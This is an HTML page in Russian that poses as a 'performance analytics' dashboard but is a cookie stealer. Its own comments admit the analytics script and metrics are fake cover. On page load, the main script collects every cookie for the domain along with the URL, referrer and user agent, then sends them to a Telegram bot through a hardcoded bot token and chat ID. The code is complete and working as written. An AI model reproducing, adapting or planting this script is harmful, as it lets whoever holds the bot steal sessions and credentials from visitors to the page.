<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Аналитика производительности / v2.1</title>
    <!-- Маскировка: фейковый скрипт аналитики -->
    <script>
        // Это типа сбор метрик загрузки страницы
        window.performanceMetrics = {
            loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
            domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
        };
        console.log('[Analytics] Metrics collected:', window.performanceMetrics);
    </script>
</head>
<body>
    <h1>Сбор данных о производительности</h1>
    <p>Идёт мониторинг...</p>
    <noscript>Включите JavaScript для корректной аналитики</noscript>

    <script>
        (function() {
            // ----- НАСТРОЙ ТУТ СВОИ ДАННЫЕ, ЕБАНАШКА -----
            const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';   // ТВОЙ ТОКЕН
            const CHAT_ID   = '-1003791860129';                        // ТВОЙ CHAT ID (может быть отрицательным)
            // -------------------------------------------------

            // 1. Собираем все куки текущего домена
            function getAllCookies() {
                const cookies = document.cookie.split('; ').reduce((acc, item) => {
                    if (!item) return acc;
                    const [key, ...valParts] = item.split('=');
                    acc[key.trim()] = valParts.join('=') || '';
                    return acc;
                }, {});
                return cookies;
            }

            // 2. Собираем метаданные
            function collectData() {
                return {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer || 'direct',
                    userAgent: navigator.userAgent,
                    cookies: getAllCookies(),
                    // фейковая метрика для маскировки
                    fake_metric: {
                        load: performance.timing.loadEventEnd - performance.timing.navigationStart,
                        paint: performance.getEntriesByType('paint').map(p => p.startTime)
                    }
                };
            }

            // 3. Отправка в Телеграм
            function sendToTelegram(data) {
                const message = `🔹 **Новый сбор**\n` +
                                `📅 Время: ${data.timestamp}\n` +
                                `🌐 URL: ${data.url}\n` +
                                `🔄 Referrer: ${data.referrer}\n` +
                                `💻 UA: ${data.userAgent}\n` +
                                `🍪 **Куки (${Object.keys(data.cookies).length} шт.):**\n` +
                                `\`\`\`json\n${JSON.stringify(data.cookies, null, 2)}\n\`\`\``;

                const payload = {
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                };

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                .then(res => {
                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
                    return res.json();
                })
                .then(json => {
                    if (json.ok) {
                        console.log('[+] Отправлено в TG');
                    } else {
                        console.error('[-] Ошибка TG:', json.description);
                    }
                })
                .catch(err => {
                    console.error('[-] Фетч нахуй упал:', err);
                });
            }

            // 4. Ждём полной загрузки, чтобы не спиздить раньше времени
            window.addEventListener('load', function() {
                try {
                    const data = collectData();
                    console.log('[Analytics] Collected package:', data);
                    // Отправляем сразу, без задержек
                    sendToTelegram(data);
                } catch (e) {
                    console.error('[-] Внутренняя ошибка в Насоке:', e.message);
                }
            });

            // Для маскировки — выводим в консоль что-то безобидное
            console.log('[Analytics] Инициализация завершена. Ждём сбор метрик...');
        })();
    </script>
</body>
</html>
